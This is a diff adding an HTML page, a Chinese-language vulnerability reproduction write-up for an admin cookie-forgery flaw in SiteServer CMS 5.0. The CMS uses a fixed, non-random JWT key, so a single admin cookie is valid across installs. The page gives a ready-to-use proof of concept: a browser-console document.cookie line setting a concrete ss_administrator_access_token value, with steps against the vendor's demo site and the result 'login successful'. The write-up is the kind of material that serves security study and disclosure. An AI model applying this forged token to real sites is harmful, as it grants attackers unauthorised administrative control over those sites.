@@ -1,0 +1,29 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="siteserver-cms-50-管理后台cookie欺骗"><span class="csDE05BCC">SiteServer CMS 5.0 </span><span class="csECDA2D3">管理后台</span><span class="csDE05BCC">Cookie</span><span class="csECDA2D3">欺骗</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">SiteServer CMS 5.0 </span><span class="cs9C1B1871">后台访问控制采用</span><span class="cs8926E06">JWT</span><span class="cs9C1B1871">技术进行身份鉴别，</span><span class="cs8926E06">HTTP</span><span class="cs9C1B1871">请求时通过</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">ss_administrator_access_token</span><span class="cs9C1B1871">字段值作为身份鉴别，而加密</span><span class="cs8926E06">ss_administrator_access_token</span><span class="cs9C1B1871">字段值的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">在安装时未进行随机初始化，导致所有相同版本的应用系统</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">可以通用</span><span class="cs8926E06">,</span><span class="cs9C1B1871">通过修改</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">可登陆任意相同版本后台。</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">SiteServer CMS 5.0</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">系统环境：</span><span class="cs8926E06">IIS 7.5 + MSSQL 2008 R2 </span><span class="cs9C1B1871">（操作系统：</span><span class="cs8926E06">Windows Server 2008 R2</span><span class="cs9C1B1871">）</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先访问一个站点，以官方体验站点为例子：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">http://cms.demo.siteserver.cn/siteserver/login.aspx</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Chrome</span><span class="cs9C1B1871">浏览器按</span><span class="cs8926E06">F12</span><span class="cs9C1B1871">切换到控制台，设置</span><span class="cs8926E06">ss_administrator_access_token</span><span class="cs9C1B1871">的</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">值（以下</span><span class="cs8926E06">PoC</span><span class="cs9C1B1871">可以直接使用）：</span></p><p class="cs3A447A38"><span class="cs9FB05234">document.cookie=&#39;ss_administrator_access_token=M3ENIa3NKJJ39JCRHnY4PgfJqMC7lFjggL0e9S06Bs9ubZE90add0xM2aesaL0add0Cxo8Xe5VZrSanerzFU8oZaMXCC9AoJfZvq5AtBXGxi0slash0tCRtk8UgV5UXu1u2pDL6htbwIqGBZx0slash0ZqVH4x0LjRE20slash0mz3FHc5QJFpTAKI0slash0AJ52LJ6XnWB7gsJuHFauL0add0q0add0sIMft8e3ef840gWzQaChpfGHfYwGS5wHFaC19T56X2J0Z5Hn500equals0&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再次访问（后面没有</span><span class="cs8926E06">login.aspx</span><span class="cs9C1B1871">）：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">http://cms.demo.siteserver.cn/siteserver/</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">登陆成功</span></p></body>
+</html>
